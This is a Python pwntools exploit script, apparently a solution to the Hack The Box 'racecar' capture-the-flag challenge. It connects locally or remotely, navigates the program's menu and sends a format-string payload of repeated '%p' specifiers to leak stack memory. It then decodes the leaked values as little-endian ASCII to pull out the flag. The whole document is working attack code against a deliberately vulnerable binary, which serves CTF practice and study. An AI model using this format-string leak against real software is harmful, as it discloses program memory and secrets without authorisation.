#!/usr/bin/env python3
from pwn import *
import re

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process(['./racecar'] + argv, *a, **kw)

p = start()
payload = b"%p " * 30

p.sendlineafter(b'Name:', b'a')
p.sendlineafter(b'Nickname:', b'aa')
p.sendlineafter(b'>', b'2') 
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'>', payload)

data = p.recv()
data = p.recv().decode('utf-8')
# log.info(data)
hex_values = data.strip().split()

flag = ''
for hex_val in hex_values:
    try:
        bytes_val = bytes.fromhex(hex_val[2:])  # Remove 0x prefix
        ascii_val = bytes_val.decode('ascii', errors='ignore')
        flag += ascii_val[::-1] # Reverse to little endian format
    except:
        continue
# log.info(flag)

match = re.search(r'HTB\{.*?\}', flag)
if match:
    extracted_flag = match.group(0)
    log.success(f"Flag: {extracted_flag}")
else:
    log.failure("Flag not found")